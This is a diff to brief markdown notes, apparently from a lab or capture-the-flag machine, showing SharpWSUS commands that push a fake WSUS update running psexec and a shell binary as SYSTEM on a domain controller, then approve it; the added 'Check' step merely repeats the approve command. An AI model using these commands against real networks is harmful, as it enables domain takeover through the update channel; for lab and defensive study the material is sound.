@@ -1,14 +1,18 @@
 https://github.com/nettitude/SharpWSUS
 
 ```powershell
-.\sharpwsus.exe create /payload:"C:\programdata\psexec.exe" /args:"-accepteula -s -d C:\\programdata\\shell.exe" /title:"privme3"
+.\sharpwsus.exe create /payload:"C:\programdata\psexec.exe" /args:"-accepteula -s -d C:\programdata\shell.exe" /title:"Pwned"
 ```
 
 Approve afterwards
 ```powershell
-.\sharpwsus.exe approve /updateid:101126cc-fce2-4691-bf33-40a701c95a49 /computername:DC.outdated.htb /groupname:"Great UpdateC21"
+.\sharpwsus.exe approve /updateid:101126cc-fce2-4691-bf33-40a701c95a49 /computername:DC.outdated.htb /groupname:"Pwned"
 ```
 
+Check
+```powershell
+.\sharpwsus.exe approve /updateid:101126cc-fce2-4691-bf33-40a701c95a49 /computername:DC.outdated.htb /groupname:"Pwned"
+```
 [Resource](https://retest.dk/wsus-local-privesc-delivery-optimization/?lang=en)
 [pywsus](https://github.com/GoSecure/pywsus)
 
